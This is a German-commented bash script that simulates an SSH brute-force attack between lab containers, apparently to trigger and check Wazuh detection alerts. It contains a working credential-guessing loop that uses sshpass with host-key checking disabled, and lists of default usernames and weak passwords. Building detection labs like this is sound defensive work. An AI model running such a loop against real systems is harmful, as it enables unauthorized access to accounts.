#!/bin/bash
# Angriffsszenario 1: SSH Brute Force Angriff
# Simuliert einen Brute-Force-Angriff auf SSH-Dienste

echo "=== SSH Brute Force Angriff Szenario ==="
echo "Dieser Angriff simuliert mehrere fehlgeschlagene SSH-Login-Versuche"
echo ""

TARGET_HOST="${1:-webserver}"
ATTACKER="${2:-attacker-internet}"

echo "[+] Starte SSH Brute Force von $ATTACKER gegen $TARGET_HOST"

# Simuliere mehrere fehlgeschlagene Login-Versuche
USERNAMES=("admin" "root" "user" "test" "administrator" "guest" "oracle" "postgres" "mysql")
PASSWORDS=("password" "123456" "admin" "root" "test" "password123" "admin123")

for user in "${USERNAMES[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "[*] Versuche Login: $user:$pass"
        sudo docker exec clab-dmz-project-sun-$ATTACKER \
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
            "$user@$TARGET_HOST" "echo success" 2>/dev/null || true
        sleep 0.5
    done
done

echo ""
echo "[+] Brute Force Angriff abgeschlossen"
echo "[+] Überprüfe Wazuh Dashboard für Alerts: https://localhost:8443"
echo "[+] Suche nach: 'authentication failed' oder 'brute force'"
